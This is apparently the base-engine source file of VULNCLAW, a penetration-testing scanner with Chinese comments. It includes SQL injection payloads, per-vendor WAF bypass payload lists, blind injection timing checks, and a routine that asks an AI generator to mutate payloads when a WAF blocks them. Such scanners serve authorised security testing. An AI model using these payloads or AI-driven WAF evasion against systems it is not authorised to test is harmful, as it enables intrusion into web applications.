# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/base.py
"""
漏洞检测引擎基类 - 修复版 v4.8
修复：增加 enable_waf_bypass 全局开关控制
"""
import asyncio
import time
import random
import os
import re
from abc import ABC, abstractmethod
from urllib.parse import urlparse, parse_qs
from collections import UserDict
from typing import Dict, List, Optional, Tuple

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import build_attack_url, async_get, obfuscate_payload
from vulnclaw.core.detectors.spa_detector import SpaFingerprintDetector
from vulnclaw.core.reflective_validator import ReflectiveValidator


def build_curl_command(url: str, method: str = "GET", data=None, headers: Optional[Dict] = None) -> str:
    """P2-5: 生成可执行的 curl 复现命令（供各引擎 findings 使用）。"""
    from urllib.parse import urlencode
    parts = ["curl", "-s", "-i", "-X", method]
    for k, v in (headers or {}).items():
        parts.append(f"-H '{k}: {v}'")
    if data is not None:
        if isinstance(data, dict):
            data = urlencode(data)
        parts.append(f"--data '{data}'")
    parts.append(f"'{url}'")
    return " ".join(parts)


def enrich_finding(finding: Dict, method: str = "GET", headers: Optional[Dict] = None) -> Dict:
    """P2-5: 为 finding 补充 reproduction_steps 与 curl_command（报告 PoC 复现）。"""
    f = dict(finding)
    curl_cmd = f.get("curl_command") or build_curl_command(
        f.get("url", ""), method=method, headers=headers
    )
    f["curl_command"] = curl_cmd
    if not f.get("reproduction_steps"):
        steps = [f"1. 发送请求：{curl_cmd}"]
        param = f.get("parameter", "")
        if param:
            steps.append(f"2. 在参数 {param} 注入恶意载荷，观察响应是否符合漏洞特征（见上方证据）。")
        steps.append("3. 对比正常/恶意请求的响应差异，确认漏洞可复现。")
        f["reproduction_steps"] = "\n".join(steps)
    return f


def annotate_chain_info(finding: Dict, url: str, param: str) -> Dict:
    """S2.1: 为 finding 附加结构化链信息（HTTP 状态/可控点/回显特征/可链性）。

    跨引擎攻击链路由（S2.2 chain_router）消费此字段：
      - SSRF -> 内网探测 / Redis 未授权
      - 文件上传 / LFI -> 可执行文件 -> RCE 链
    统一在 V100 orchestrator 的引擎结果后处理阶段调用，各引擎无需各自实现。
    """
    f = dict(finding or {})
    ftype = str(f.get("type", "")).lower()
    evidence = str(f.get("evidence", "") or "")
    status = f.get("status") or f.get("http_status")
    chainable = any(
        k in ftype
        for k in ("ssrf", "ssr", "upload", "上传", "lfi", "文件包含", "cmdi", "rce", "命令执行")
    )
    echo_feature = bool(re.search(r"反射|回显|reflect|echo|状态码|差异", evidence, re.I))
    f["chain_info"] = {
        "http_status": status,
        "controllable_point": "param" if param else "unknown",
        "echo_feature": echo_feature,
        "chainable": chainable,
        "finding_type": f.get("type", ""),
        "version": 1,
    }
    return f


class CaseInsensitiveDict(UserDict):
    def __getitem__(self, key):
        return self.data.get(key.lower())

    def __setitem__(self, key, value):
        self.data[key.lower()] = value

    def __delitem__(self, key):
        del self.data[key.lower()]

    def get(self, key, default=None):
        return self.data.get(key.lower(), default)

    def __contains__(self, key):
        return key.lower() in self.data

    @classmethod
    def from_dict(cls, d: Dict) -> "CaseInsensitiveDict":
        instance = cls()
        for k, v in d.items():
            instance[k] = v
        return instance


class BaseEngine(ABC):
    name: str = "base"
    description: str = "基础漏洞检测引擎"
    payloads: List[Tuple[str, str]] = []
    priority_params: List[str] = []

    max_payloads: int = 20
    enable_obfuscation: bool = True
    ab_verify_threshold: float = 0.25
    time_based_threshold: float = 4.5

    NORMAL_RESP_CACHE_TTL: int = 60

    def __init__(self, spa_detector: Optional[SpaFingerprintDetector] = None):
        self._waf_bypass_cache: Dict[str, List[str]] = {}
        self._payload_cache: Dict[str, List[Tuple[str, str]]] = {}
        self._cache_max_size = getattr(settings, "engine_cache_max_size", 100)
        self._ai_generator = None
        self._enable_smart_waf = os.getenv("ENABLE_SMART_WAF_BYPASS", "false").lower() == "true"
        self._waf_bypass_tool = None
        self._normal_resp_cache: Dict[str, Tuple[Tuple[int, str, Dict], float]] = {}
        self._normal_resp_lock = asyncio.Lock()
        self.spa_detector = spa_detector  # SPA检测器
        self.reflective_validator = ReflectiveValidator()  # 反射验证器

    def _normalize_response(self, text: str) -> str:
        if not text:
            return ""
        text = re.sub(r'["\']csrf_token["\']?\s*[:=]\s*["\'][a-zA-Z0-9]{16,}["\']', '', text)
        text = re.sub(r'["\']_token["\']?\s*[:=]\s*["\'][a-zA-Z0-9]{16,}["\']', '', text)
        text = re.sub(r'["\']authenticity_token["\']?\s*[:=]\s*["\'][a-zA-Z0-9]{16,}["\']', '', text)
        text = re.sub(r'["\']nonce["\']?\s*[:=]\s*["\'][a-zA-Z0-9]{8,}["\']', '', text)
        text = re.sub(r'["\']state["\']?\s*[:=]\s*["\'][a-zA-Z0-9]{8,}["\']', '', text)
        text = re.sub(r'\btimestamp["\']?\s*[:=]\s*\d{10,}', '', text)
        text = re.sub(r'\btime["\']?\s*[:=]\s*\d{10,}', '', text)
        text = re.sub(r'\bts["\']?\s*[:=]\s*\d{10,}', '', text)
        text = re.sub(r'"timestamp":\s*\d{13,}', '', text)
        text = re.sub(r'"ts":\s*\d{13,}', '', text)
        text = re.sub(r'"time":\s*\d{13,}', '', text)
        text = re.sub(r'"created_at":\s*\d{13,}', '', text)
        text = re.sub(r'"updated_at":\s*\d{13,}', '', text)
        text = re.sub(r'"expires_at":\s*\d{13,}', '', text)
        text = re.sub(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', '', text, flags=re.I)
        text = re.sub(r'\b[a-f0-9]{32,64}\b', '', text, flags=re.I)
        text = re.sub(r'[a-zA-Z0-9-_]+\.(css|js)\?v=[a-zA-Z0-9]+', '', text)
        text = re.sub(r'[a-zA-Z0-9-_]+\.(css|js)\?ver=[a-zA-Z0-9]+', '', text)
        text = re.sub(r'\b_=\d{10,}', '', text)
        text = re.sub(r'\bnonce=\d{10,}', '', text)
        text = re.sub(r'\brandom=\d{10,}', '', text)
        return text

    def strip_payload_reflection(self, text: str, *payloads: str) -> str:
        """移除响应中被回显的 payload 本身（原文/URL编码形态）。

        准确率修复：回显型目标（如 httpbin /get）会把注入参数原样回显到响应里，
        导致 A/B 两个响应"天然不同"（回显的 payload 文本不同），布尔盲注 A/B 验证
        由此产生大量误报。对比前先把各自响应中的 payload 剥掉，只比较剩余差异。
        """
        if not text:
            return text or ""
        cleaned = text
        for p in payloads:
            if not p:
                continue
            cleaned = cleaned.replace(p, "")
            try:
                from urllib.parse import quote, unquote
                cleaned = cleaned.replace(quote(p, safe=""), "")
                cleaned = cleaned.replace(unquote(p), "")
            except Exception:
                pass
        return cleaned

    def has_response_diff(
        self,
        normal_resp: Tuple[int, str, Dict],
        attack_resp: Tuple[int, str, Dict],
        threshold: float = None
    ) -> Tuple[bool, float]:
        if threshold is None:
            threshold = self.ab_verify_threshold

        # 检测SPA状态，如果是SPA则降低判定阈值
        if hasattr(self, 'spa_detector') and self.spa_detector and self.spa_detector.get_spa_status():
            threshold = max(0.1, threshold * 0.3)  # SPA下降低判定阈值

        normal_status, normal_text = normal_resp[0], normal_resp[1]
        attack_status, attack_text = attack_resp[0], attack_resp[1]

        if normal_status == 200 and len(normal_text) == 0:
            if len(attack_text) == 0:
                return False, 0.0
            if len(attack_text) > 0 and attack_status == 200:
                return False, 0.0

        normal_clean = self._normalize_response(normal_text)
        attack_clean = self._normalize_response(attack_text)
        # Remove dynamic values that commonly vary between otherwise identical responses.
        dynamic_value_patterns = [
            r'(?i)(?:timestamp|created[_-]?at|updated[_-]?at|expires[_-]?at|nonce|token|csrf[_-]?token|session[_-]?id|request[_-]?id|trace[_-]?id|random|cache[_-]?bust)\s*["\']?\s*[:=]\s*["\']?[A-Za-z0-9._-]{6,}["\']?',
            r'(?i)(?:[?&](?:_|\w*(?:token|nonce|timestamp|random|cachebust))=)[A-Za-z0-9._%+-]{6,}',
        ]
        for pattern in dynamic_value_patterns:
            normal_clean = re.sub(pattern, '', normal_clean)
            attack_clean = re.sub(pattern, '', attack_clean)

        normal_len = max(1, len(normal_clean))
        attack_len = len(attack_clean)

        length_diff = abs(attack_len - normal_len) / normal_len

        content_diff = 0.0
        if normal_len > 50 and attack_len > 50:
            normal_words = set(normal_clean.split())
            attack_words = set(attack_clean.split())
            if normal_words and attack_words:
                intersection = normal_words & attack_words
                union = normal_words | attack_words
                if union:
                    content_diff = 1 - len(intersection) / len(union)
        elif normal_len > 0 or attack_len > 0:
            if (normal_len == 0) != (attack_len == 0):
                content_diff = 0.8

        status_bonus = 0.05 if normal_status != attack_status else 0.0
        total_diff = min(1.0, length_diff * 0.35 + content_diff * 0.6 + status_bonus)

        return total_diff > threshold, total_diff

    async def _get_normal_response(
        self,
        url: str,
        session,
        force_refresh: bool = False
    ) -> Tuple[int, str, Dict]:
        async with self._normal_resp_lock:
            now = time.time()
            if url in self._normal_resp_cache and not force_refresh:
                cached_resp, timestamp = self._normal_resp_cache[url]
                if now - timestamp < self.NORMAL_RESP_CACHE_TTL:
                    return cached_resp

        try:
            resp = await async_get(url, session=session, timeout=10, no_retry=True)
            if isinstance(resp, tuple) and len(resp) >= 2:
                status = resp[0]
                text = resp[1] if resp[1] else ""
                headers = resp[2] if len(resp) > 2 else {}
                if status in (200, 301, 302, 307):
                    fresh = (status, text, headers)
                    async with self._normal_resp_lock:
                        self._normal_resp_cache[url] = (fresh, time.time())
                    return fresh
        except Exception as e:
            logger.debug(f"刷新正常响应失败: {e}")

        return (200, "", {})

    async def _ai_mutate_payload(self, error_msg: str, original_payload: str, param_name: str = "", waf_type: str = None) -> List[str]:
        try:
            from vulnclaw.ai.dispatcher import PayloadGenerator
            if self._ai_generator is None:
                self._ai_generator = PayloadGenerator()
            result = await self._ai_generator.generate(
                error_msg=error_msg,
                context=original_payload,
                param_name=param_name,
                waf_type=waf_type
            )
            if result and isinstance(result, list):
                payloads = []
                for item in result:
                    if isinstance(item, dict) and "payload" in item:
                        payloads.append(item["payload"])
                    elif isinstance(item, str):
                        payloads.append(item)
                unique = list(dict.fromkeys([original_payload] + payloads))
                return unique[:3]
        except Exception as e:
            logger.debug(f"AI Payload 生成失败: {e}")
        return [original_payload]

    @abstractmethod
    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        pass

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        return []

    def get_payloads(self, param: str = None, max_count: int = None) -> List[Tuple[str, str]]:
        if max_count is None:
            max_count = self.max_payloads

        cache_key = f"{param or 'default'}_{max_count}"
        if cache_key in self._payload_cache:
            return self._payload_cache[cache_key]

        payloads = self.payloads.copy()

        if param and param.lower() in self.priority_params:
            result = payloads[:max_count]
        else:
            half = max(3, len(payloads) // 2)
            result = payloads[:min(half, max_count)]
            if param and self.priority_params:
                for p, desc in payloads:
                    if any(kw in desc.lower() for kw in self.priority_params):
                        if (p, desc) not in result:
                            result.append((p, desc))

        if len(self._payload_cache) >= self._cache_max_size:
            oldest_key = next(iter(self._payload_cache))
            del self._payload_cache[oldest_key]
        self._payload_cache[cache_key] = result
        return result

    def reorder_payloads_by_param(self, param: str, max_count: int = None) -> List[Tuple[str, str]]:
        payloads = self.get_payloads(param, max_count)
        if not param:
            return payloads

        param_lower = param.lower()
        matched = []
        unmatched = []
        for p, desc in payloads:
            if param_lower in p.lower() or param_lower in desc.lower():
                matched.append((p, desc))
            else:
                unmatched.append((p, desc))
        return matched + unmatched

    def is_param_relevant(self, param: str) -> bool:
        return True

    def get_priority_score(self, param: str) -> int:
        param_lower = param.lower()
        for i, p in enumerate(self.priority_params):
            if p in param_lower:
                return len(self.priority_params) - i
        return 0

    def is_boolean_param(self, param_value: str) -> bool:
        if not param_value:
            return False
        return param_value.lower() in ['true', 'false', '0', '1', 'yes', 'no']

    async def detect_waf(self, resp_text: str) -> Optional[str]:
        if not resp_text or not isinstance(resp_text, str):
            return None

        # ============================================================
        # 瓶颈4：WAF 签名匹配是纯字符串遍历（30+ WAF × 平均 2~3 条签名），
        #   - 响应文本 > 64KB → 单次 substring 扫描会阻塞事件循环 ~10ms；
        #   - 并发 10 条请求 + 每请求 20 payload = 200 次 → 累积 2s。
        # 策略：text 较长或 payload 场景下，把纯字符串工作扔进 to_thread。
        # ============================================================
        if len(resp_text) >= 20_000:
            return await asyncio.to_thread(self._detect_waf_sync, resp_text)
        return self._detect_waf_sync(resp_text)

    def _detect_waf_sync(self, resp_text: str) -> Optional[str]:
        waf_signatures = {
            "cloudflare": ["cf-ray", "__cfduid", "cf_clearance", "Cloudflare", "Cloudflare Ray ID"],
            "aws_waf": ["x-amzn-RequestId", "AWS WAF", "Request blocked"],
            "modsecurity": ["ModSecurity", "www.modsecurity.org", "mod_security"],
            "akamai": ["X-Akamai-Transformed", "Akamai", "Access Denied"],
            "f5_bigip": ["X-Cnection", "X-F5-Client-IP", "BigIP", "F5"],
            "imperva": ["X-Iinfo", "Imperva", "Incapsula"],
            "sucuri": ["X-Sucuri-ID", "Sucuri"],
            "wordfence": ["Wordfence", "Generated by Wordfence"],
            "barracuda": ["X-Barracuda", "Barracuda"],
            "fortinet": ["X-Fortinet", "Fortinet"],
            "paloalto": ["X-Pan", "Palo Alto"],
            "radware": ["X-Radware", "Radware"],
            "citrix": ["X-Citrix", "Citrix"],
            "ddos_guard": ["X-DDOS-Guard", "DDOS-Guard"],
            "stackpath": ["X-StackPath", "StackPath"],
            "fastly": ["X-Served-By", "X-Cache", "Fastly"],
            "azure_waf": ["X-Msedge-Ref", "Azure", "Azure WAF"],
            "gcp_waf": ["X-GCP", "Google Cloud"],
            "aliyun_waf": ["X-Aliyun", "Aliyun", "Aliyun WAF"],
            "tencent_waf": ["X-Tencent", "Tencent"],
            "aws_cloudfront": ["X-Amz-Cf-Id", "CloudFront"],
        }

        resp_lower = resp_text.lower()
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in resp_lower:
                    return waf_name
        return None

    def get_waf_bypass_payloads(self, waf_type: str) -> List[str]:
        if waf_type in self._waf_bypass_cache:
            return self._waf_bypass_cache[waf_type]

        bypass_map = {
            "cloudflare": [
                "1' OR '1'='1'/*", "1' OR '1'='1'#", "1' OR '1'='1'-- -",
                "1'/**/OR/**/'1'='1", "1'%20OR%20'1'='1",
            ],
            "aws_waf": [
                "1' OR '1'='1'/**/", "1' OR 1=1/**/",
                "1' UNION/**/SELECT NULL-- -", "1'%0AOR%0A'1'='1",
            ],
            "modsecurity": [
                "1' OR '1'='1'%00", "1' OR 1=1%00",
                "1' UNION SELECT NULL%00", "1'/**/OR/**/'1'='1",
            ],
            "akamai": [
                "1' OR '1'='1'/*!*/", "1' OR 1=1/*!*/",
                "1' UNION SELECT NULL/*!*/", "1'%09OR%09'1'='1",
            ],
            "f5_bigip": [
                "1' OR '1'='1'--", "1' OR 1=1--",
                "1' UNION SELECT NULL--", "1'%23OR%23'1'='1",
            ],
            "aliyun_waf": [
                "1' OR '1'='1'/**/", "1' OR '1'='1' and 1=1",
                "1' UNION SELECT NULL,version()--",
            ],
            "tencent_waf": [
                "1' OR '1'='1'/*", "1' OR '1'='1'-- -",
                "1' AND 1=1 AND '1'='1",
            ],
        }

        payloads = bypass_map.get(waf_type, bypass_map.get("modsecurity", []))
        self._waf_bypass_cache[waf_type] = payloads
        return payloads

    async def try_waf_bypass(
        self,
        url: str,
        param: str,
        original_payload: str,
        parsed_query: str,
        session,
        waf_type: str,
        normal_resp: Tuple[int, str, Dict]
    ) -> Optional[Dict]:
        # 全局 WAF 绕过开关
        if not getattr(settings, 'enable_waf_bypass', True):
            return None

        from vulnclaw.core.scanner import safe_request
        from vulnclaw.engines.auxiliary_engines import WAFBypass

        if self._waf_bypass_tool is None:
            self._waf_bypass_tool = WAFBypass()

        # 第一阶段：测试经典签名payload是否被拦截
        classic_payloads = [
            "' OR '1'='1--",
            "' OR '1'='1#",
            "admin'--",
            "admin'#",
            "1' OR '1'='1",
            "1' OR '1'='1#",
            "1' OR '1'='1--",
            "1' OR '1'='1#",
            "1' OR '1'='1--",
            "1' OR '1'='1#",
        ]
        
        waf_blocked = False
        for classic_payload in classic_payloads:
            try:
                test_url = build_attack_url(url, param, classic_payload, parsed_query)
                resp = await safe_request(test_url, session, method="GET", timeout=30)
                if resp is None:
                    continue
                
                attack_status, attack_text = resp[0], resp[1]
                
                # 检查是否被WAF拦截（403或特定拦截页面）
                if attack_status == 403 or (attack_status == 200 and await self._is_waf_block_page(attack_text)):
                    waf_blocked = True
                    break
            except Exception:
                continue
        
        # 如果经典payload未被拦截，直接退出（不是真正的WAF）
        if not waf_blocked:
            logger.info(f"⚠️ WAF {waf_type} 未拦截经典签名，跳过绕过测试")
            return None

        logger.info(f"🧠 专项 WAF 绕过启动: {waf_type}")

        bypass_payloads = self._waf_bypass_tool.get_all_bypasses(original_payload, waf_type)
        bypass_payloads = [p for p in bypass_payloads if p != original_payload][:10]
        bypass_payloads.extend(self.get_waf_bypass_payloads(waf_type))

        timeout = getattr(settings, 'timeout', 30)

        for bypass_payload in bypass_payloads[:15]:
            try:
                test_url = build_attack_url(url, param, bypass_payload, parsed_query)
                resp = await safe_request(test_url, session, method="GET", timeout=timeout)
                if resp is None:
                    continue

                attack_status, attack_text = resp[0], resp[1]

                if not isinstance(attack_text, str):
                    continue

                # 第二阶段：检测是否仍有WAF拦截特征
                waf_detected = await self.detect_waf(attack_text)
                if waf_detected is not None:
                    continue

                # 第三阶段：验证绕过是否成功（反射token/报错/A-B测试）
                success = await self._verify_waf_bypass_success(
                    url, param, bypass_payload, parsed_query, session, normal_resp
                )
                
                if success:
                    logger.info(f"✅ WAF 绕过成功: {waf_type} -> {bypass_payload[:30]}...")
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': bypass_payload,
                        'type': f'{self.name.upper()}-WAF绕过({waf_type})',
                        'ai_verdict': '高（WAF绕过）',
                        'confidence': 'high',
                        'evidence': f'WAF ({waf_type}) 被绕过',
                        'waf_bypass': True
                    }
            except Exception as e:
                logger.debug(f"WAF 绕过测试失败: {e}")

        logger.info("🧠 静态 WAF 绕过失败，尝试 AI 动态生成...")
        error_msg = f"WAF {waf_type} 拦截了 Payload: {original_payload}"
        ai_payloads = await self._ai_mutate_payload(error_msg, original_payload, param, waf_type)

        for ai_payload in ai_payloads:
            if ai_payload == original_payload:
                continue
            try:
                test_url = build_attack_url(url, param, ai_payload, parsed_query)
                resp = await safe_request(test_url, session, method="GET", timeout=timeout)
                if resp is None:
                    continue

                attack_status, attack_text = resp[0], resp[1]

                if not isinstance(attack_text, str):
                    continue

                waf_detected = await self.detect_waf(attack_text)
                if waf_detected is not None:
                    continue

                # 验证AI生成的payload是否成功绕过
                success = await self._verify_waf_bypass_success(
                    url, param, ai_payload, parsed_query, session, normal_resp
                )
                
                if success:
                    logger.info(f"✅ AI 生成的 Payload 绕过 WAF: {ai_payload[:30]}...")
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': ai_payload,
                        'type': f'{self.name.upper()}-AI WAF绕过({waf_type})',
                        'ai_verdict': '高（AI动态绕过）',
                        'confidence': 'high',
                        'evidence': f'WAF ({waf_type}) 被 AI 生成 Payload 绕过',
                        'waf_bypass': True,
                        'ai_generated': True
                    }
            except Exception as e:
                logger.debug(f"AI Payload 测试失败: {e}")

        return None

    async def _is_waf_block_page(self, response_text: str) -> bool:
        """检测响应是否为WAF拦截页面"""
        waf_patterns = [
            r"access denied",
            r"forbidden",
            r"blocked",
            r"security",
            r"firewall",
            r"protection",
            r"challenge",
            r"captcha",
            r"error",
            r"unauthorized",
            r"invalid request",
        ]
        
        for pattern in waf_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    async def _verify_waf_bypass_success(
        self,
        url: str,
        param: str,
        payload: str,
        parsed_query: str,
        session,
        normal_resp: Tuple[int, str, Dict]
    ) -> bool:
        """验证WAF绕过是否成功（⑥统一反射门槛：12位token反射/报错/A-B测试）

        三段式要求的最后一步：
        1. 生成唯一12位token，拼接进绕过payload
        2. 剥离基线后确认token在响应中新出现（反射）
        3. 或出现SQL报错签名，或A/B延时稳定可复现
        """
        # 复用统一反射验证器（12位token + 剥离基线 + body/头/JS 三处检查）
        reflected, _evidence = await self.reflective_validator.validate_reflection(
            url, param, payload, parsed_query, session,
            baseline_resp=normal_resp
        )
        # 反射即认为绕过成功（WAF未拦截且目标反映了注入点）
        if reflected:
            return True

        try:
            # 报错签名二次确认（反射缺失但出现数据库错误 = 注入仍成功）
            test_payload = f"{payload} AND 1=2 AND '1'='"
            test_url = build_attack_url(url, param, test_payload, parsed_query)
            resp = await safe_request(test_url, session, method="GET", timeout=30)
            if resp is None:
                return False
            attack_text = resp[1] if resp[1] else ""

            error_patterns = [
                r"sql syntax",
                r"mysql|mariadb|postgresql|oracle|sqlite|mssql",
                r"syntax error|unclosed quotation|unterminated",
                r"database error|db error",
                r"exception|fatal|critical",
            ]
            for pattern in error_patterns:
                if re.search(pattern, attack_text, re.IGNORECASE):
                    return True

            # A-B延时验证：稳定可复现的延时也算绕过成功
            start_time = time.time()
            resp = await safe_request(test_url, session, method="GET", timeout=30)
            if resp is None:
                return False
            elapsed_1 = time.time() - start_time

            start_time = time.time()
            resp = await safe_request(test_url, session, method="GET", timeout=30)
            if resp is None:
                return False
            elapsed_2 = time.time() - start_time

            if elapsed_1 > 3.0 and elapsed_2 > 3.0:
                return True
        except Exception:
            pass

        return False

    async def ab_verify(
        self,
        url: str,
        param: str,
        payload_a: str,
        payload_b: str,
        parsed_query: str,
        session,
        normal_resp: Tuple[int, str, Dict]
    ) -> Dict:
        from vulnclaw.core.scanner import safe_request

        url_a = build_attack_url(url, param, payload_a, parsed_query)
        url_b = build_attack_url(url, param, payload_b, parsed_query)
        timeout = getattr(settings, 'timeout', 30)

        try:
            tasks = [
                safe_request(url_a, session, method="GET", timeout=timeout),
                safe_request(url_b, session, method="GET", timeout=timeout)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            if isinstance(results[0], Exception) or isinstance(results[1], Exception):
                return {"verified": False, "reason": "请求失败", "diff_ratio": 0.0}

            if results[0] is None or results[1] is None:
                return {"verified": False, "reason": "safe_request 返回 None", "diff_ratio": 0.0}

            resp_a, resp_b = results[0], results[1]
            status_a, text_a = resp_a[0], resp_a[1]
            status_b, text_b = resp_b[0], resp_b[1]

            # 准确率修复：任一方为 5xx/429/0（服务器不稳定、限流、连接失败）
            # 时，差异来自错误页而非布尔逻辑 → 不算验证通过
            if status_a in (0, 429) or status_a >= 500 or status_b in (0, 429) or status_b >= 500:
                return {
                    "verified": False,
                    "reason": f"服务器不稳定 (A={status_a}, B={status_b})",
                    "diff_ratio": 0.0
                }

            # 准确率修复：先剥离各自响应中被回显的 payload，
            # 回显型目标（httpbin 等）否则 A/B 必然"不同"（回显文本不同）→ 假阳性
            text_a = self.strip_payload_reflection(text_a, payload_a)
            text_b = self.strip_payload_reflection(text_b, payload_b)

            has_diff, diff_ratio = self.has_response_diff(
                (status_a, text_a, {}),
                (status_b, text_b, {}),
                threshold=0.15
            )

            status_diff = status_a != status_b

            if has_diff or status_diff:
                return {
                    "verified": True,
                    "diff_ratio": diff_ratio,
                    "evidence": f"A/B 差异: {diff_ratio:.1%}, 状态码 {'不同' if status_diff else '相同'}",
                    "url_a": url_a,
                    "url_b": url_b,
                    "status_a": status_a,
                    "status_b": status_b
                }
            else:
                return {"verified": False, "diff_ratio": diff_ratio, "reason": "A/B 响应差异过小"}

        except Exception as e:
            return {"verified": False, "reason": f"验证请求失败: {e}", "diff_ratio": 0.0}

    async def detect_time_based(
        self,
        url: str,
        param: str,
        payload_sleep: str,
        payload_no_sleep: str,
        parsed_query: str,
        session,
        sleep_seconds: int = 5,
        threshold: float = None
    ) -> Tuple[bool, float]:
        if threshold is None:
            threshold = self.time_based_threshold

        url_sleep = build_attack_url(url, param, payload_sleep, parsed_query)
        url_no_sleep = build_attack_url(url, param, payload_no_sleep, parsed_query)

        try:
            start_sleep = time.time()
            await async_get(url_sleep, session=session, timeout=sleep_seconds + 5, no_retry=True)
            elapsed_sleep = time.time() - start_sleep

            start_no_sleep = time.time()
            resp_no_sleep = await async_get(url_no_sleep, session=session, timeout=10, no_retry=True)
            elapsed_no_sleep = time.time() - start_no_sleep

            diff = elapsed_sleep - elapsed_no_sleep
            if diff > 3.0:
                return True, diff
            return False, diff

        except asyncio.TimeoutError:
            try:
                resp_no_sleep = await async_get(url_no_sleep, session=session, timeout=5, no_retry=True)
                if isinstance(resp_no_sleep, tuple) and resp_no_sleep[0] != 0:
                    return True, float(sleep_seconds + 2)
            except BaseException:
                pass
            return False, 0.0
        except Exception as e:
            logger.debug(f"时间盲注检测异常: {e}")
            return False, 0.0

    async def probe_param(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session
    ) -> bool:
        test_payloads = ["'", '"', "1'", '1"', "test"]
        getattr(settings, 'timeout', 30)

        for probe in test_payloads[:3]:
            try:
                test_url = build_attack_url(url, param, probe, parsed_query)
                resp = await async_get(test_url, session=session, timeout=5, no_retry=True)
                if resp is None:
                    continue
                text = resp[1]
                if len(text) > 100:
                    return True
            except BaseException:
                pass
        return True

    def obfuscate_payloads(
        self,
        payloads: List[Tuple[str, str]],
        level: int = 1
    ) -> List[Tuple[str, str]]:
        if not self.enable_obfuscation:
            return payloads

        # ============================================================
        # 瓶颈4：obfuscate_payload 是纯 CPU（字符串替换 + base64 + URL 编码），
        # payloads 多时 (>50 条) 直接在事件循环里同步跑 100~200 次字符串变换 →
        # 阻塞 20~80ms，导致瓶颈1/2/3 打开的并发全部被反压。
        #
        # 注意：这是同步 def 方法，只能在同步上下文或异步上下文里 "明知 payload 少"
        # 时调用。异步上下文中请改用 obfuscate_payloads_async()，会使用
        # asyncio.to_thread 把 >50 条的大 payload 计算扔出事件循环。
        # ============================================================
        return self._obfuscate_payloads_sync(payloads, level)

    async def obfuscate_payloads_async(
        self,
        payloads: List[Tuple[str, str]],
        level: int = 1
    ) -> List[Tuple[str, str]]:
        """异步入口：优先使用，统一处理"payload 大时 offload 到 worker 线程"。

        协程里调用请用这个方法；同步上下文里调用 obfuscate_payloads()，它会在
        小 payload 场景原地跑，大 payload 场景 fallback 到同步版（退化阻塞但功能正确）。
        """
        if not self.enable_obfuscation:
            return payloads
        if len(payloads) > 50:
            return await asyncio.to_thread(self._obfuscate_payloads_sync, payloads, level)
        return self._obfuscate_payloads_sync(payloads, level)

    def _obfuscate_payloads_sync(
        self,
        payloads: List[Tuple[str, str]],
        level: int = 1
    ) -> List[Tuple[str, str]]:
        """纯同步、可安全扔进 to_thread 的实现。"""
        result = []
        for payload, desc in payloads:
            result.append((payload, desc))
            if random.random() > 0.3:
                try:
                    mutated = obfuscate_payload(payload, level)
                    if mutated != payload:
                        result.append((mutated, f"{desc}(混淆)"))
                except BaseException:
                    pass
        return result

    def extract_params_from_url(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in qs.items()}

    def build_full_url(self, url: str, param: str, payload: str, parsed_query: str = '') -> str:
        return build_attack_url(url, param, payload, parsed_query)

    def get_normal_text(self, normal_resp: Tuple[int, str, Dict]) -> str:
        if isinstance(normal_resp, tuple):
            return normal_resp[1]
        return getattr(normal_resp, 'text', '')

    def get_normal_status(self, normal_resp: Tuple[int, str, Dict]) -> int:
        if isinstance(normal_resp, tuple):
            return normal_resp[0]
        return getattr(normal_resp, 'status', 0)

    def get_headers(self, resp: Tuple[int, str, Dict]) -> CaseInsensitiveDict:
        if isinstance(resp, tuple) and len(resp) > 2:
            return CaseInsensitiveDict.from_dict(resp[2])
        return CaseInsensitiveDict()

    def log_debug(self, message: str) -> None:
        logger.debug(f"[{self.name}] {message}")

    def log_info(self, message: str) -> None:
        logger.info(f"[{self.name}] {message}")

    def log_warning(self, message: str) -> None:
        logger.warning(f"[{self.name}] {message}")

    def log_error(self, message: str) -> None:
        logger.error(f"[{self.name}] {message}")


__all__ = ['BaseEngine', 'CaseInsensitiveDict']

async def _parse_response(resp):
    """统一响应解析：兼容 tuple(status,text[,headers]) 与 aiohttp.ClientResponse 两种格式。"""
    if isinstance(resp, tuple):
        if len(resp) >= 3:
            return resp[0], resp[1] or "", resp[2] if len(resp) > 2 else {}
        elif len(resp) >= 2:
            return resp[0], resp[1] or "", {}
        return 0, "", {}
    status = getattr(resp, 'status', 0)
    text = await resp.text() if hasattr(resp, 'text') and callable(getattr(resp, 'text', None)) else str(resp)
    headers = dict(getattr(resp, 'headers', {}))
    return status, text, headers

